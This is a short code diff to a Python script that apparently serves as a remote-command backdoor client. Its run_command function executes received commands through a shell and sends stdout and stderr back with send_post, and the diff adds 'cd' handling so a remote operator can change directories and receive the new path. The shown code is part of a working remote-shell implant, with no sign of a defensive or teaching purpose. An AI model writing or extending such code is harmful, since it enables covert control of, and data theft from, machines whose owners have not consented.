@@ -33,6 +33,12 @@ def send_file(command):
 
 
 def run_command(command):
+    # Added to change directory 
+    com = command.split(" ",1)
+    if "cd" == com[0].lower():
+       os.chdir(com[1])
+       cwd = os.getcwd()
+       send_post(cwd.encode('utf-8'))
     CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     send_post(CMD.stdout.read())
     send_post(CMD.stderr.read())
